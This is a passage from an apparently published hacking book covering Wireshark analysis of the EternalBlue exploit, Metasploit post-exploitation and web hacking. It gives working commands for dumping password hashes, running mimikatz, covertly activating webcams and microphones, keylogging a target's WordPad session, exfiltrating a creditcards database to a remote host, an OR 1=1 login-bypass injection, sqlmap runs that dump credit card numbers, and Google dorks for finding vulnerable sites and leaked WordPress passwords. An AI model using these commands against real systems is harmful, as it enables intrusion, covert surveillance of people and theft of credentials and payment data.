---
title: Getting Started Becoming a Master Hacker_ Hacking is the - Part 3
source: Getting Started Becoming a Master Hacker_ Hacking is the.md
category: development
---


## Page 379

Description
==
Equal To
!=
Not Equal To
>
Greater Than
<
Less Than
>=
Greater than or Equal To
<=
Less Than or Equal To
contains
Protocol or Field Contains a Value
matches
Protocol or Text Field Matches a Regular
Expression
We can now create a filter by simply selecting a field in the left window;
select a relation in the upper right window; and select a value in the lower
right window (values are very often 1 or 0 meaning they exist or do not).

## Page 380

For instance, if we want to find all tcp packets with the RST flag set, we
would enter: tcp.flags.rst==1
Following Streams
It some cases, rather than examine all the packets of a particular protocol or
traveling to a particular port or IP, you want to follow a stream of
communication. Wireshark enables you to do this with little effort.
This technique can be useful if you are trying to follow, for instance, the
conversation of a rogue, disgruntled employee who is trying to do damage
to your network.
To follow a stream, select a packet by clicking on it and then right-click.
188 | P a g e

## Page 381


## Page 382

This opens a pull-down window like that above. Click "Follow" and then
"TCP Stream."
This opens a window that includes all the packets and their content in this
stream. Note the statistics at the bottom of the window to the far left (5796
bytes) and the method of displaying the content (ASCII).
Statistics
Finally, we may want to gather statistics on our packet capture. This can be
particularly useful in creating a baseline of normal traffic. Click on the
Statistics tab at the top of Wireshark, and a pull-down menu appears. In our
case, let's navigate down to the IPv4 Statistics and then All Addresses .
189 | P a g e

## Page 383

As you can see above, Wireshark has listed every IP address with activity
and some basic statistics for each IP address.

## Page 384

Now that we understand the basics of using a packet analyzer like
Wireshark, let's apply it to a real-world problem—the NSA's EternalBlue
exploit that we used in Chapter 9 to exploit the Windows 7 system.
Using Wireshark To Analyze the NSA’s EternalBlue Exploit
Throughout this book, we have been focusing on the notorious EternalBlue
exploit that was stolen from the NSA, possibly by Russian hackers. In this
section, we want to see what Eternal Blue looks like from a packet-level
inspection in Wireshark. This analysis can help us to understand how
EternalBlue works, which can lead to better security to prevent it (creating
an anti-virus or IDS’s signature) and possibly the development of exploits
similar to it.
In April 2017, a nefarious group known only as the ShadowBrokers
released a group of exploits that were stolen from the US National Security
Agency (NSA). The NSA is charged with protecting US citizens from
terrorist and other threats to security, but has also been known to spy on US
citizens. In this capacity, the NSA develops and purchases zero-day
exploits. Someone at the NSA in Ft. Mead, MD, stole some of the exploits
and provided them to this shadowy group, which then tried to sell them on
the Internet. When no one stepped up to purchase these at the minimum
asking price (of course, priced in Bitcoin), the Shadow Brokers released the
exploits to anyone who wanted them.
Among this group of exploits, there was one known as EternalBlue. This
exploit took advantage of a vulnerability in Server Message Block (SMB)
protocol on port 445. This protocol enables file, drive, and printer sharing
on local area networks, among other things. When the exploit works
properly, it enables the attacker to execute their code (RCE) with system
administrator privileges on the target system. The exploit is similar to an
earlier (but NOT the same, as some have reported) exploit against SMB
known as MS08-067. Microsoft designated this EternalBlue vulnerability
MS17-010 and patched it March 2017
190 | P a g e

## Page 385

(apparently, the NSA, knowing that the exploits were stolen and would soon
be released, notified Microsoft and the patch was available before the
exploit was released).
Despite Microsoft's patch, later that same year, both the WannaCry, Petya
and NotPetya ransomware (see the History of Hacking in Chapter 1 for
more on this ransomare) attacks utilized the EternalBlue exploit for their
malicious purposes and wreaked havoc around the world. All told,
EternalBlue and its offspring were responsible for billions of dollars of
damage.
Given the severity of this exploit and its consequences, it is worth studying
it—not only to recognize this singular attack, but also to become familiar
enough with this type of attack to recognize the next variant that is certainly
coming in the future.

## Page 386

You can download a .pcap capture of the EternalBlue exploit here on
DropBox.
Download eternalblue-success-unpatched-win7-1.pcap from Dropbox here .
If you are unfamiliar with the Microsoft implementation of SMB (even
most experts are not) and want to learn more, Microsoft has an excellent
reference here.
Once the pcap file loads into Wireshark, go to packets 6 and 7. Here you see
the protocol (SMB)
negotiation. You should see a Negotiate Protocol Request and Negotiate
Protocol Response packets .
These two packets are initiating the SMB protocol communication.
191 | P a g e

## Page 387

In the very next packet, you see a Session Setup and the user " anonymous
."
This is followed two packets later where you should see " Tree Connect"
and Path:
\\192.168.198.203\IPC$. This is the hacker attempting to connect to an IPC
share on the target machine.
You can also see the IPC share attempt and the IP address in the lower
window.
Create a Filter for SMB Only Traffic
Rather than viewing all the packets, let's focus on just the SMB packets. In
the filter window, enter
"SMB," and now you should only see SMB packets in the live window at
the top. This should make our further analysis much more straightforward.

## Page 388

NT Trans Request
Next, the exploit sends out NT Trans Request with a considerable payload
(see the middle window) and a large number of NOPs (No Operation). You
can see the NOP's in the lower window of Wireshark.
NOPs are No Operations, where the CPU cycles are expended, but nothing
is done. NOPs are common
among buffer overflow exploits (for more on buffer overflows, see
https://www.hackers-
arise.com/post/2017/05/26/exploit-development-part-1-anatomy-of-buffer-
overflows ). The attack is preparing the SMB for the specially crafted
packet necessary to exploit the system.
192 | P a g e

## Page 389


## Page 390

This large NT Trans request leads to many Secondary Trans2 Requests
made necessary by the large request size. These act as a trigger point for the
vulnerability and the request portion contains the shellcode and encrypted
payload, which is the launcher for the malware on the remote machine.
Trans2 Response
Now, let's navigate down to packet #165. Here we see a Trans2 Response
with STATUS_INVALID_PARAMETER . This is the victim's machine
responding, which means that
the overwrite has been successful.
193 | P a g e

## Page 391

Next, let's check to see whether the payload has successfully installed. If it
has, we should find the SMB
Multiplex ID = 82 field in one of the packets. Let's now create a filter for
that field and look for it in our stream of packets.
As you can see above, we did find a packet with the SMB Multiplex ID set
to 82.
Follow the Stream

## Page 392

Finally, if we right-click on the Trans2 packet from Step #5 above and
select Follow -> TCP Stream , we see the contents of the packets. Here we
can see the contents of the payloads that created the buffer overflow and
delivered the payload that enabled this exploit.
194 | P a g e

## Page 393


## Page 394


## Page 395

When we follow the stream, Wireshark displays the payload contents as
seen below.

## Page 396

195 | P a g e
Summary
Detecting and preventing network attacks is a crucial responsibility of the
network and information security engineers. Without knowing what the
attack looks like from the packet-level makes that task challenging, if not
impossible. Here, by analyzing the EternalBlue attack packet-by-packet, we
can be better prepared to prevent this or similar type attack on our network.
Wireshark is an essential tool in the toolbox of any information security
engineer or hacker. This tool can provide us insights into what is happening
in our network and even analyze network attacks to prevent them or re-
engineer new ones. Tcpdump is an excellent tool for network traffic
analysis when the a GUI is not available or the system is remote.
Exercises
Create the following Filters in Wireshark on your live traffic;
(1) TCP IP address
(2) TCP destination IP address
(3) TCP flag RST
(4) IP DF flag
(5) Filter for all traffic leaving your IP address
(6) Filter for the term “hackers-arise”
11
196 | P a g e

## Page 397

1 1
Post Exploitation
Never become predictable
Master OTW
Once we have successfully exploited the target system, like we
did in Chapter 9, our job has just begun! We didn’t exploit the
system just to get inside and send a greeting. We exploited the system for a
purpose. That purpose is often called post exploitation in the
hacking/penetration testing world. In the nonpenetration testing world,it’s

## Page 398

called “getting the goodies.”
An exploit gets us inside the target system, and the payload enables us to
connect to, and operate inside, the target system. Now that we are inside,
we need to decide what we want to do there. Do we want to: 1. Grab the
passwords?
2. Listen to their conversations?
3. Place a keylogger on the system to record all their keystrokes?
4. Turn on their webcam, take snapshots or stream video?
197 | P a g e
5. Scan the network to find a particular system such as the database server?
6. Or simply use the target system as a foothold to take over the entire
network?
In this chapter, we will assume a scenario where we are working for our
national espionage/intelligence agency and have been charged with
obtaining information from the target for national security purposes.
We will attempt to do each of the tasks enumerated above on the target
system.
Post-Exploitation Capabilities

## Page 399

Once we are inside the system, our capabilities will depend, in part, upon
several factors. These factors include the following:
1. Do we have system admin privileges?
2. What payload did we place inside the system?
3. What service or application did we exploit?
In Chapter 9, we exploited the SMB service on the Windows 7 system. We
were able to get the system administrator privileges and placed the
windows/meterpreter/reverse_http payload inside the
system.
Search for Post-Exploitation Modules
When using Metasploit for postexploitation, we have numerous options. We
can view all the post-
exploitation modules in Metasploit by using the search command and
entering:
msf5 > search type:post
As you can see, there are over 300 post-exploitation modules.
We can narrow this search by just looking for those that can be used on
Windows systems (in our case, we will be using a Windows 7 system).
msf5 > search type:post platform:windows
198 | P a g e

## Page 400

Even after we narrow our search to just Windows systems,there are still
quite a few (over 200) postexploitation modules in Metasploit available to
us.
In addition to the many post-exploitation modules, the Metasploit
meterpreter has a number of built-in commands. From the meterpreter
prompt, we can simply enter help to get the commands that will work with
this meterpreter. These commands are NOT universal in all meterpreters,
and instead, are particular to each one. This means that we need to enter
help to view which commands will work with this
meterpreter or whichever one you are using (remember that there are many
meterpreters).
meterpreter> help
199 | P a g e

## Page 401

This list is quite long, but these are the core commands in the meterpreter. If
we scroll down a bit, we can see some key commands for postexploitation,
including the standard “User Interface Commands,” the
“Webcam Commands,” and the “Audio Output Commands.”
200 | P a g e

## Page 402

I want to emphasize that these commands vary by the meterpreter you are
using, so try the help
command if you are using a different meterpreter. Many of these commands
are NOT available in the Linux/UNIX and other operating systems (Linux,
BSD, UNIX, etc.) meterpreters.
Let’s begin our post-exploitation and get the goodies!
Exploitation in Windows 7
In Chapter 9, we exploited our Windows 7 system with the NSA’s
EternalBlue exploit and got the

## Page 403

meterpreter prompt, as we see below.
201 | P a g e
meterpreter>
Now that we have the meterpreter on the target system, let’s look at what
we can do inside there. In some cases, we may want to know if the system
is idle and how long. If someone is working on the system, the chances of
detection increase, although our activities will not be obvious to the user
unless they use tools such as Windows task manager, Sysinternal’s Process
Monitor or similar tools.
To find out how long the system has been idle, we can use the built-in
command idletime.
meterpreter > idletime

## Page 404

As you can see, this system has been idle for just 48 minutes and 56
seconds. The system’s owner is likely nearby. Better to be cautious than
dead!
If we have system administrator privileges on the target—as we do with the
EternalBlue exploit—we can get all the hashes of all the passwords by
simply using the hashdump command.
meterpreter > hashdump
202 | P a g e

## Page 405

Now that we have these hashes, we can download them and crack them in
one of the many password
crackers in Kali, such as hashcat. To capture these hashes to a file, simply
enter;
meterpreter > hashdump > hashes
Then, use the built-in download command in our meterpreter.
meterpreter > download hashes
In addition, our espionage/intelligence service may want to see what is
happening in the room where the computer is located. The meterpreter has a
command that will turn on the webcam and take a single snapshot. It’s
named webcam_snap. Before we use it, we need to check to see whether a
webcam exists on the system and what number has been assigned to it by
the operating system. We can use the

## Page 406

webcam_list command to do that.
meterpreter> webcam_list
As you can see in the screenshot above, the target system has one webcam,
and it has been assigned the number 1. If there were multiple webcams, we
would need to use the number in the next command, but this command
defaults to 1, so it’s not necessary here.
In this case, we can command the
webcam to take snapshot by entering;
meterpreter > webcam_snap
When we enter the command, the
meterpreter snaps a picture and opens it
on our desktop screen.
203 | P a g e

## Page 407

We now have a picture of our adversary sitting behind his computer !
Notice that it takes the snapshot and places the snapshot in the /root
directory with a random name (hzMVZRtV.jpeg) and added the .jpeg
extension.
Stream the WebCam
In some cases, our superiors may want a stream of the activity in the room
with the target computer. Let’s go to another computer at the location,
exploit it, and stream the video. The command to do so is: meterpreter >
webcam_stream
This command will open the default
browser (in this case, Mozilla
Firefox) on your system and begin

## Page 408

to stream the webcam live into the
browser, as seen here.
Keylogger or How to View Every Keystroke
As a spy, we may want to capture all the keystrokes being entered by the
target. This could reveal secret and confidential plans, passwords and other
information. You are probably familiar with hardware keyloggers.
Hardware keyloggers are usually
physically placed on the target system and then
record all keystrokes of the keyboard, such as
this keylogger sold on Amazon.
The keylogger in Metasploit is a little different.
It’s a software keylogger. The advantage is that
it can be installed remotely. The disadvantage is
that it can only record keystrokes on one process
at a time (conceivably, you could have multiple meterpreters, keylogging
multiple processes such as MS
Word, Notepad, Chrome, and Firefox, all at the same time).
To employ our keylogger, we need to decide what process we want to
capture keystrokes from and then migrate (move) the meterpreter to that
process.
The first step is to enter ps at the meterpreter prompt. Just like in Linux, this
will list all the processes running on the target system.
meterpreter > ps

## Page 409

204 | P a g e
As you can see above, all the processes running on the targeted Windows 7
system are displayed with PID, PPID, Process Name, Arch, Session, User,
and Path.
If we scan down a bit through this list, we can see a process for Wordpad.

## Page 410

The highlighted process—2396—is running Wordpad, the built-in
wordprocessor in Windows. Generally, WordPad is not open unless the user
is writing in it. Let’s try keylogging that process.
To do so, we need to move or migrate our meterpreter to that process.
meterpreter > migrate 2396
Now that we have planted the meterpreter on this process, we can start the
keylogger. As you might expect, the command is keyscan_start.
meterpreter > keyscan_start
205 | P a g e
When we are ready to retrieve the keystrokes, we can simply use the
keyscan_dump command.
meterpreter > keyscan_dump
Looks like our target has some nefarious plans! Good thing we captured all
their keystrokes!
Using the Target System as a Listening “Bug”
As a spy, in addition to taking snapshots or streaming video from the
webcam, you may want to enable the built-in microphone on their computer
to listen to the conversations of the target. In the history of hacking, there

## Page 411

have been a number of pieces of malware that have done exactly this,
including Flame and Duqu.
Once again, the meterpreter has a built-in command for doing so,
record_mic.
meterpreter > record_mic
As you can see, when we run this command, it records the ambient sounds
near the computer and places them in a .wav (audio) file in the root user's
directory with a random file name.
This meterpreter command has numerous options that can be useful. For
instance:
-d :
the number of seconds to record (default = 1 sec)
-f :
The .wav file path.
-p :
Automatically play the captured audio, by default “true.”
Now, we can construct a useful command that records ten seconds of audio,
creates a .wav file named spyaudio.wav, and automatically plays back the
audio through your system’s speakers.
meterpreter > record_mic -d 10 -f spyaudio.wav -p true
206 | P a g e

## Page 412

Of course, we can enable this bug for any number of seconds by simply
changing the value after the –d option. So, for instance, if we wanted to
capture one hour of audio we could change that value to 3600: meterpreter
> record_mic -d 3600 -f spyaudio.wav -p true
Mimikatz
In some cases, the hashdump command will not work to retrieve the
password hashes on the local system.
In that case, we have another tool that can grab passwords. This tool,
mimikatz, was developed by Benjamin Delpy, aka gentilkiwi.
Mimikatz is capable of extracting and parsing information from RAM.
Among the most important
information we are seeking are the password hashes on the local system.
When the system boots up, it loads these hashes into RAM, and with a tool
like mimikatz, we can extract them. Mimikatz has been part of some of the
most significant hacks in history, including NotPetya and Blackenergy3
(https://www.hackers-arise.com/post/2018/10/10/scada-hacking-anatomy-
of-a-scada-malware-
blackenergy-3 ).
The first step is, from the meterpreter prompt, to load kiwi (if your target is
a 32-bit system, you will load mimikatz).

## Page 413

meterpreter> load kiwi
Once kiwi has loaded, we can simply run the following command to extract
the hashes out of the
running system’s SAM file:
meterpreter> mimikatz_command –f samdump::hashes
207 | P a g e

## Page 414

As you can see above, mimikatz was able to extract all of the user accounts
on the local system from RAM and display them for us. To learn more
about mimikatz’s many capabilities, go to
https://www.hackers-arise.com/post/2018/11/26/metasploit-basics-part-21-
post-exploitation-with-
mimikatz .
Scanning the Internal Network
Very often, the ultimate target of our attack is different from the system we
compromised. The ultimate target may be another system on the network,
such as the database or domain controller on the same network. Now that
we have a foothold inside the network, we may be able to leverage that
foothold to compromise the entire network!
The first step to compromising other systems on the network is to scan to
see what is available on the network. Ultimately, we want to pivot from the
compromised system to other computers and devices on the same network.
To find out what other systems are on the network, the meterpreter has a
post-exploitation command, arpscanner. Address Resolution Protocol is
used to map MAC addresses to IP addresses on the LAN.
This tool emulates this process to get the systems on the network to give up
their IP and MAC addresses.
Now we know each of the systems on the network!
208 | P a g e

## Page 415

Post Exploitation of MySQL
In Chapter 8, we used a brute-force password-cracking tool on the MySQL
database on a Windows 7
target. We easily recovered the password because the administrator had
used a weak one. Now that we have the password, what can we do in post-
exploitation?
Connect to the Database
The first step is to connect to the MySQL database on the Windows 7
system using the password we cracked in Chapter 8.
Drop into a Shell
First, we need to drop into a Windows shell from the meterpreter.
meterpreter>shell
Then we need to connect to MySQL.
C:\Windows\system32> mysql –u root –p

## Page 416

You will be prompted for a password. Type the password from Chapter 8
and hit ENTER.
We will now get a mysql prompt.
mysql>
Next, we request MySQL to show us all its databases.
mysql > show databases;
209 | P a g e
As you can see, there is a database that looks interesting named “moviedb.”
That’s the one we created on the Windows 7 system with the script from
Chapter 4.
Next we need to direct the MySQL database system that we want to use that
database (movedb).
mysql > use database moviedb
We can then show the tables within that database.
mysql > show tables;
To view all the data from the table creditcards, we can enter:
mysql > SELECT * FROM creditcards;

## Page 417

If the amount of data is too large to take a picture of and copy to a piece of
paper, we can dump the entire database to our Kali system. First, we need to
quit mysql and go to a command prompt.
mysql > quit
C:\
Now, from the command, we can invoke the mysqldump command that is
used to create database
backups and direct its output to our remote system:
mysqldump –u root –p –h 192.168.1.103 movie-db > backup.sql
Summary
After exploiting the target, the attacker usually wants to do something on
the system. This is often referred to as post-exploitation. Using Metasploit,
we have numerous options with Metasploit commands and post-
exploitation modules that enable us to:
1. Extract password hashes;
2. Snap or stream the webcam;
3. Activate and record from the microphone;
4. Scan the network;
5. Keylog all the keystrokes of the target.
210 | P a g e
On the MySQL database, because the administrator had used a weak
password, we are able to extract or dump all the data in the database to our
remote system.
Exercises

## Page 418

1. Search for all the post-exploitation modules in Metasploit.
2. Search for all the Windows post-exploitation modules in
Metasploit.
3. Exploit a Windows 7 system and get the meterpreter prompt.
4. Use the hashdump command to capture hashes and download
to your Kali.
5. Migrate the meterpreter to process the target is using and
capture their keystrokes.
6. Connect and login to the mysql databasewith the password you
found in Chapter 8 and dump the database.
211 | P a g e

## Page 419

1 2
Web Hacking
If a service is free, you are not the customer. You are the product.
Master OTW
The Internet and the World Wide Web (www) have
made so many wonderful things possible in their brief
lifetimes . The list of things wonderful things could go on for pages,
but probably most significant is the development of e-commerce and
social networking. These two applications have changed our lives in
profound ways. Yet, with all these benefits, there has come a dark side.
All of this traffic is susceptible to interception and alteration.
212 | P a g e

## Page 420

Before we begin this chapter, please note the title of this chapter is “Web
Hacking.” Unlike many books on hacking and penetration testing, it is not
“Web App Hacking.” The reason is that there are
innumerable ways to hack Web traffic and not all of them are attacking the
web application or web app.
To begin this chapter, let’s begin by thinking strategically about web
hacking. There are many strategies for hacking web traffic, and rather than
focus on just one, let’s look at the range of possibilities and then focus on
just a few. A single chapter in a book about hacking can barely scratch the
surface, so instead, we will focus on strategy and a few examples.
If you are new to web technologies or need to brush up on the
fundamentals, take a look at my article on Hackers-Arise covering the
basics of web technologies at https://www.hackers-arise.com/single-
post/2018/07/22/Web-App-Hacking-Web-Application-Technologies-Part-1.
Approaches to Web Hacking
Although there are hundreds of ways of hacking the web, they can be
grouped into eight basic types.
1. Hacking Client Side Controls
One of the most popular areas of web hacking is attacking the client-side
controls.
2. Hacking Authentication
Hacking authentication can include bypassing authentication such as
capturing tokens and
replaying them, client-side piggybacking, cross-site request forgery, and of
course, cracking
usernames and passwords (see the section below on harvesting usernames
from WordPress sites

## Page 421

and brute-forcing their passwords).
3. Hacking Session Management
Session management enables an application to identify a user across
multiple requests uniquely.
When a user logs in, session management enables the user to interact with
the Web app without
having to reauthenticate for every request. Due to its key role, if we can
break the application's session management, we can bypass the
authentication. In this way, we won't need to crack the
username and password to gain access.
4. Hacking Access Controls & Authorization
In this area, the hacker fingerprints access control lists (ACL) and attacks
the ACLs in ways that will allow a hacker to violate the ACLs.
5. Hacking Back End Components
Hacking back end components includes SQL injection with tools such as
sqlmap (see the section
below on SQL injection), but also includes attacks and injection against
XPATH and LDAP.
213 | P a g e
6. Hacking the Use r
Hacking the user is one of my favorite Web hacks. Technically, it's not Web
hacking, as we are
hacking the enduser, not the Web app, by getting them to travel to our
website and load malware

## Page 422

to their browser and potentially their system. These techniques include
cross-site scripting (XSS), cross-site request forgery, attacking the browser,
and violations of the same-origin policy.
7. Hacking the Web Application Management
In many cases, Web applications have a management console or other
management interface. If
we can access that console or interface, we can conceivably change
everything about the website, including defacing it.
8. Hacking the Web Server
In some cases, we can hack the underlying server of the Web applications,
such as Microsoft's
Internet Information Server (IIS), the Apache Project's Apache server, or
nginx. If we can gain
control and access to the underlying server, it may give us an entry point to
the Web applications.
Website Vulnerabilities
According to the Open Web App Security Project (OWASP), the following
are the ten most important Web app vulnerabilities in 2019:
1. Injection
2. Broken Authentication and Session Management
3. Sensitive Data Exposure
4. XML External Entity
5. Broken Access Control
6. Security Misconfiguration

## Page 423

7. Cross-Site Scripting
8. Insecure De-serialization
9. Using Components with Known Vulnerabilities
Since OWASP assigns “Injection” the highest priority (I agree. SQLi results
in the greatest financial losses to websites overall), let’s discuss it next.
Let’s examine the common type of Injection attack: SQL injection.
SQL Injection or SQLi
SQL or the Structured Query Language is the universal language of
relational databases. First developed by IBM in the 1970s (what wasn’t
developed by IBM in the 1960s and 1970s?), it is now used in nearly every
database management system (DBMS), including MySQL (MariaDB),
Microsoft’s SQL Server,
IBM’s DB2, Oracle, postgesql, and many others. This language is used
primarily to query the database for data, but is also used to delete, update,
and insert data.
214 | P a g e

## Page 424

Relational Database Model
Behind nearly every website is a database. These databases are used for
authentication, e-commerce, storing website objects, storing credit card
numbers, storing customer data, and nearly everything else. If the attacker
can send SQL commands through the web application to the backend
database, they may be able to get the database to execute the commands and
delete or, better still, spill its data.
Before we examine SQL injection attacks, we need first to understand a bit
of SQL. SQL is a simple language that is forgiving on syntax, but
demanding on logic. The most basic SQL query looks something like this;
SELECT <columns>

## Page 425

FROM <table>
WHERE <conditions>
In the SELECT clause, the coder is looking to return data from certain
columns in tables. In the FROM
clause, the coder is defining the table the columns should be extracted
from. The WHERE defines the conditions that data should meet, such as
city=Detroit .
This basic query can be used for authentication purposes as well. Imagine a
database that has every user with their username and password in a table
named "USERS.” We could authenticate our users by asking them for their
username and password in a form and then checking the database table to
see if those two match for a single user. Such a query would look like this
when the user entered the data into the authentication form.
215 | P a g e

## Page 426

SELECT USERNAME, PASSWORD
FROM USERS
WHERE USERNAME ='OTW' AND PASSWORD = 'HackersArise'
Notice that in the WHERE clause with the conditions, we have a logical
AND. This means that both conditions must evaluate to TRUE for the user
to successfully authenticate and gain access to the system.

## Page 427

If either is FALSE, then the query evaluates to FALSE, and the user does
not get authenticated and entry to the system.
This method is similar to the way most systems authenticate users.
Notice also that in both the username field and the password field, the
entries are enclosed with a single quote ('). This is standard in SQL when
using strings (text) in the WHERE clause.
Getting Past the Authentication
It is also important to note that in SQL, the double dash (--) acts as a
comment character. This means that if a “—“ appears, the SQL interpreter
ignores everything after it on that line.
Now, what would happen if I entered the following information into the
authentication form?
216 | P a g e
Now, when that information is sent back to the database, the SQL query
would look like this: SELECT USERNAME, PASSWORD
FROM USERS
WHERE USERNAME = 'OTW' OR 1=1-- AND PASSWORD = 'anything'
When the database evaluates this statement, USERNAME='OTW’ is
TRUE. Furthermore, 1=1 also
always evaluates to true. Everything after the -- (in green) is seen as a
comment and ignored by the SQL
interpreter, so that statement evaluates to TRUE, and you are authenticated
without even using a password!
The more you know about SQL, the more effective you can be with SQL
injection. We are making use of standard SQL commands and characters
that make the database do what WE want. Some of the key SQL

## Page 428

injection characters include:
Character
Description
;
Statement termination
‘ or “
Character string indicators
-- or #
Single line comment
/*….*/
Multiple line comment
+
Addition or concatenation
||
concatenate
%
wildcard
?Param1=foo&Param2=bar
URL Parameters
PRINT

## Page 429

Useful as non-transactional command
@variable
Local variable
@@variable
Global variable
Wait for delay ’00.00.00’
Time delay for blind SQL Injection
Now that we have a basic knowledge of SQL injection, let’s try it on a test
site.
217 | P a g e
SQL Injection with sqlmap
There are numerous tools for SQL injection, but probably the most
widelyused is sqlmap. The beauty of sqlmap is its ability to identify the
backend database, enumerate its structure and inject SQL commands into
the database from a Web form. In addition, it will work against most of the
RDMS’s.
To get "inside" the website and, ultimately, the database, we need to find an
entry point. We are looking for websites that end in "php?id=xxx" where
“xxx” represents some number. We can identify these sites by using Google
hacks/dorks. For instance, you can do a search on Google by entering:
inurl:index.php?id=
inurl:gallery.php?id=
inurl:post.php?id=
inurl:article?id=

## Page 430

...among many others.
These dorks will bring up millions of websites with this basic vulnerability
criteria. If you are creative and ambitious, you can find numerous websites
online that list vulnerable websites. You might want to check these out.
In Chapter 7, we did vulnerability scanning of numerous systems. One of
these tools was OWASP-ZAP, developed by the Open Web Application
Security Project (OWASP). In Chapter 7, we used it to scan for
vulnerabilities in the website www.webscantest.com. If we go back to our
results in Chapter 7, we can see that OWASP-ZAP listed numerous places
where the site was vulnerable to SQL Injection. One of these was:
www.webscantest.com/datastore/search_get_by_id.php?id=4
Let’s use that URL to see whether we can execute a SQLi attack against this
site.
Sqlmap is built into our Kali, so no need to download or install anything.
You can access sqlmap by simply entering sqlmap at the command line. If
you follow the sqlmap command with –h option, it will display its help
screen like below.
kali > sqlmap -h
218 | P a g e

## Page 431


## Page 432

We can simplify the usage of sqlmap syntax to;
sqlmap –u <URL> <options if any>
If we run this command againt the URL potentially vulnerable to SQL
injection that we identified with OWASP-ZAP, we should be able to gather
some basic information we need to get started. The
219 | P a g e

## Page 433

information we need includes; (1) the type of database management system,
(2) the operating system, and (3) the version of PHP the developers used on
the site.
kali > sqlmap –u
“http://www.webscantest.com/datastore/search_get_by_id.php?id=”
As you can see above, sqlmap was able to identify the backend database to
this site as MySQL version
>=5.0, the operating system as Linux Ubuntu, the PHP version as 5.5.9, and
the web server as Apache 2.4.7. Not bad for a single command!
Identify the Databases within the DBMS
The next step is to try to identify what databases are on this system. A quick
note about terminology; MySQL, MS SQL Server, Oracle, postgreSQL, and
others are Database Management Systems (DBMS).
This is the software that manages databases. Databases are created within
these DBMSs. We now need to identify what databases exist within this
database system.
We can identify the databases within this system by simply adding the
option –dbs such as:

## Page 434

kali > sqlmap –u “http://
www.webscantest.com/datastore/search_get_by_id.php?id= 1” –dbs As
you can see above, sqlmap identified two databases, information schema,
and
webscantest. Since information schema is a database used by the DBMS,
it’s not really of
interest to us here, so we’ll focus our attention on the webscantest database.
220 | P a g e

## Page 435


## Page 436

The next step is to find the structure of that database. If we are looking for
specific information in the database, we need to find out where it is. We can
probably learn that when we enumerate the tables and columns in this
database.
kali > sqlmap –u
“http://www.webscantest.com/datastore/ search_get_by_id.php?id=1”
–columns –D webscantest
When we do so, sqlmap will target the webscantest database and attempt to
enumerate the tables and columns in this database.
As we can see above, sqlmap successfully enumerated three tables: (1)
accounts, (2) inventory, and (3) orders, complete with column names and
datatypes. Not Bad! If we look closely at the orders table, we can see fields
there with credit card information (billing_CC_number). Let’s try to grab
that data.
221 | P a g e
Once we have access to the database, know the name of the database along
with tables and columns, we can now begin to dump the data. To do that
from the credit card number column in the orders table, we can enter the
following command:
kali > sqlmap –u

## Page 437

“http://www.webscantest.com/datastore/ search_get_by_id.php?id= 1” –
dump –C
billing_CC_number –T orders –D webscantest
Where:
- C billing_CC_number is the column with the credit card numbers
- T orders
is the table name where the column we want is located
-D webscantest
is the database with the data
As you can see above, sqlmap was able to extract the data from that column
and placed it into our Kali system at
/root/.sqlmap/output/www.webscantest.com. Success!
Attacking WordPress Websites
There are numerous technologies used to build websites and, because of
that, the techniques and
strategies of attacking them are quite different. How you attack a .NET
based website will be quite different from how you would attack a
WordPress website (for some generic attack strategies, see the Web App
Hacking series at Hackers-Arise).
Many websites are built with what is commonly known as Content
Management Systems (CMS). Very
often, these CMSs are built on the common LAMP stack of Linux, Apache,
MySQL, and PHP. Some of
these commonly used CMSs include WordPress, Joomla, Drupal, Ruby on
Rails, and several others. At the time of this writing, these are the most

## Page 438

common CMSs with their market numbers.
WordPress
22.6M
Joomla
1.84M
Drupal
.6M
Magento
.2M
Blogger
.34M
222 | P a g e

## Page 439

As you can see, WordPress is the 800-pound gorilla in this category. Not
only is WordPress the most popular CMS, but WordPress is also used in
nearly 30 percent of all websites on planet Earth!
Since WordPress is so popular and compromises such a large part of the
market, it makes some sense to focus our efforts in that area.
Finding WordPress-Based Websites
The first step is to find WordPress based websites. There are numerous
ways to do this. Among the easiest ways is to use Google Hacking.
Remember from Chapter 5, where we used some keywords to
find specific data in Google’s database. We can do the same here for finding
websites built on WordPress.
WordPress has some unique signatures in the URL’s that it generates. For
instance, you will find the following to be part of most Wordpress sites.
wp-content
wp-config
wp-includes
wp-json
wp-login
…and many others.
We can use these identifying and unique signature URL to find Wordpress
sites with Google dorks such as:
inurl:wp-content
inurl:wp-config
inurl:wp-includes

## Page 440

…and others.
Let’s try the first of these dorks and see how many WordPress sites we can
find.
As you can see, Google found 213 million websites with that signature in
its URL. That’s quite a haul!
Let’s get a bit more specific. Let’s see how many “hacking” websites are
using WordPress. We can refine our Google dork by adding the word
“hacking” after the inurl: clause. This will act like a logical AND
thereby restricting our output to sites that meet both those criteria.
inurl:wp-content hacking
223 | P a g e

## Page 441


## Page 442

We have successfully narrowed down our search to just 1.9 million sites.
As we saw in Chapter 5, Google dorks can also serve as an exploitation
strategy as well, if our dork can find a data leak with passwords. For
instance, many WordPress sites automatically make a backup of their
database commands and store them on the site. These backups often have
passwords stored in plain text.
Let’s look for one.
inurl:wp-config-backup.txt
This Google dork will seek backup files in WordPress sites. When we run
this Google Dork, we find 108
results. Let’s click on one.
As you can see, this site leaked its critical data when it made a backup. Next
to the first arrow, we see the database name. Next to the second arrow, we
find the username, and finally, next to the last arrow, we find the user
password!
When people leave their passwords in their websites, the hacking becomes
very, very simple.
224 | P a g e

## Page 443

How are WordPress Sites Hacked?
WordPress is made of a core product that enables the developer to add
themes and plugins. Although the core WordPress has had a number of
serious security issues over the years, the plugins are the most common

## Page 444

vector for hacking WordPress sites. These plugins are often developed by
small, individual developers and many are not properly vetted for security
before being placed on the market. As a result, they are the “low-hanging
fruit” of the WordPress ecosystem.
As you can see below, plugins were responsible for over 50 percent of
WordPress hacks.
WordPress Vulnerabilities
In Chapter 7, we looked at vulnerability scanning of operating systems and
applications. Here, let’s look at a vulnerability scanner specific to
WordPress named, wpscan.
wpscan was developed by Sucuri, a security consulting firm specializing in
WordPress.
This is an excellent tool for finding vulnerabilities in WordPress sites,
themes, and plugins.
wpscan is built into our Kali, so to start wpscan, we simply enter:
kali > wpscan –h
225 | P a g e

## Page 445

This command displays wpscan’s help screen as seen above. wpscan has
numerous options, but we can boil down its syntax to:
wpscan –url <URL>
This syntax enables us to point this tool at any WordPress site and get back
a report of its known vulnerabilities. Let’s try that.
Earlier, we used Google hacks to find sites built with WordPress. Let’s use
one of these for our test (choose any of them). To protect the innocent, I
will obscure the name of the site, but it is a real website found by our
Google hack.
When you run this command, if wpscan prompts you to update its database,
enter Y.
kali > wpscan –url <website name>
